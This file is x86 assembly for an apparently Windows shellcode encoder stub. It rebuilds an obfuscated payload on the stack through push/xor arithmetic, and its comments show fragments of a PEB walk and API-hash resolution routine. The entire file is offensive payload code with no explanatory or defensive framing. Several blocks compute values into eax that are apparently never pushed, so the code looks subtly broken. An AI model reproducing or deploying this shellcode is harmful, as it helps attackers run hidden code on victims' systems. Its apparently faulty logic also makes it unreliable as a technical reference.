section .text

global _start
_start:
    pushad
    pushfd
register:
    push 0x21
    pop eax
    xor al , 0x21
    push eax
    pop ebx
    dec ebx
    push esp
    pop ecx
encode:
; push 0xf9eb585a
    push 0x533f322c
    pop eax
    xor eax, 0x552b6a76
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
    inc edx
    xor byte [edx], dl
; push 0xe18bd2ff
    push 0x37227c4a
    pop eax
    xor eax, 0x2956514a
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
    inc edx
    xor byte [edx], dl
    inc edx
    xor byte [edx], dl
    inc edx
    xor byte [edx], dl
; push 0x500a6ae0
    push 0x2d2f4657
    pop eax
    xor eax, 0x7d252c48
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
; push 0x89212121
    push 0x5b58446a
    pop eax
    xor eax, 0x2d79654b
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
; push 0x21242c81
    push 0x4c4d704e
    pop eax
    xor eax, 0x6d695c30
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
; push 0x848d8284
    push 0x2b26474f
    pop eax
    xor eax, 0x50543a34
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
    inc edx
    xor byte [edx], dl
    inc edx
    xor byte [edx], dl
    inc edx
    xor byte [edx], dl
; push 0x68212121
    push 0x3d6f5775
    pop eax
    xor eax, 0x554e7654
; push 0x21242c81
    push 0x54777e48
    pop eax
    xor eax, 0x75535236
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
; push 0x21212121
    push 0x59545273
    pop eax
    xor eax, 0x78757352
; push 0x68da0188
    push 0x326c3b2a
    pop eax
    xor eax, 0x5a493a5d
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
    inc edx
    xor byte [edx], dl
; push 0x148b4a0c
    push 0x225a7234
    pop eax
    xor eax, 0x362e3838
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
; push 0x8b66585a
    push 0x3f496c2d
    pop eax
    xor eax, 0x4b2f3477
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
; push 0xe0753c3e
    push 0x26485354
    pop eax
    xor eax, 0x393d6f6a
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
; push 0x6889fa81
    push 0x384d6558
    pop eax
    xor eax, 0x503b6026
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
    inc edx
    xor byte [edx], dl
    inc edx
    xor byte [edx], dl
; push 0xf4ebc201
    push 0x3f485378
    pop eax
    xor eax, 0x345c6e79
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
    inc edx
    xor byte [edx], dl
    inc edx
    xor byte [edx], dl
; push 0x11cac107
    push 0x4a6f4a4e
    pop eax
    xor eax, 0x5b5a7449
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
    inc edx
    xor byte [edx], dl
; push 0x74c084ac
    push 0x3f4f306f
    pop eax
    xor eax, 0x4b704b3c
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
    inc edx
    xor byte [edx], dl
    inc edx
    xor byte [edx], dl
; push 0xd231c031
    push 0x45597453
    pop eax
    xor eax, 0x68684b62
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
    inc edx
    xor byte [edx], dl
; push 0xde018f34
    push 0x6b2e5c7d
    pop eax
    xor eax, 0x4a2f2c49
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
    inc edx
    xor byte [edx], dl
; push 0x8b494be3
    push 0x2928763a
    pop eax
    xor eax, 0x5d613d26
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
    inc edx
    xor byte [edx], dl
; push 0x52da0124
    push 0x614d6b53
    pop eax
    xor eax, 0x33686a77
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
; push 0x528bdf01
    push 0x7a35735f
    pop eax
    xor eax, 0x2841535e
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
    inc edx
    xor byte [edx], dl
; push 0x207a8b50
    push 0x68313b6a
    pop eax
    xor eax, 0x484b4f3a
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
; push 0xd8011c42
    push 0x4b573b23
    pop eax
    xor eax, 0x6c562761
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
; push 0x8b144a8b
    push 0x48213822
    pop eax
    xor eax, 0x3c357256
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
    inc edx
    xor byte [edx], dl
; push 0xda01781a
    push 0x687a2d59
    pop eax
    xor eax, 0x4d7b5543
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
; push 0x548b3c53
    push 0x2249592b
    pop eax
    xor eax, 0x763d6578
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
; push 0x8b105b8b
    push 0x22477039
    pop eax
    xor eax, 0x56572b4d
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
    inc edx
    xor byte [edx], dl
; push 0x1b8b1b8b
    push 0x2828405d
    pop eax
    xor eax, 0x335c5b29
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
    inc edx
    xor byte [edx], dl
; push 0x145b8b0c
    push 0x7a6a2d32
    pop eax
    xor eax, 0x6e31593e
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
; push 0x5b8b305b
    push 0x21475861
    pop eax
    xor eax, 0x7a33683a
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
; push 0x8b64db31
    push 0x3c356b4f
    pop eax
    xor eax, 0x48514f7e
    push esp
    pop edx
    inc edx
    xor byte [edx], dl
    inc edx
    xor byte [edx], dl
retpre:
    push ecx
    pop esp
    popfd
    popad
    ret
